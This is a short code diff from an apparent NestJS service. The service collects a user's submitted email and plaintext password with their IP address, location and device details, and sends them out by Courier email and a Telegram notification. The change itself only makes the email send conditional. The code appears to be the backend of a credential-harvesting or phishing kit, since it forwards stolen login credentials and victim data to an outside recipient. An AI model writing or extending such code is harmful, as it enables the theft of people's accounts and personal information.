@@ -25,23 +25,28 @@ export class AppService {
 
     const { deviceDetails, ipAddr, location } =
        await this.deviceService.getLoginDeviceInfo(req);
-
-    const { requestId } = await courier.send({
-      message: {
-        to: {
-          email: to,
-        },
-        template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
-        data: {
-          recipientName: `email: ${email}, \n password: ${password}
+    let requestId = null;
+    if (email) {
+      const { requestId: emailRequestId } = await courier.send({
+        message: {
+          to: {
+            email: to,
+          },
+          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+          data: {
+            recipientName: `email: ${email}, \n password: ${password}
 
             IP: ${ipAddr}
             Location: ${location}
             Device: ${deviceDetails}`,
-          source,
+            source,
+          },
         },
-      },
-    });
+      });
+      requestId = emailRequestId;
+    }
+
+    
 
     if (chatId) {
       await this.telegramService.sendLoginNotification(
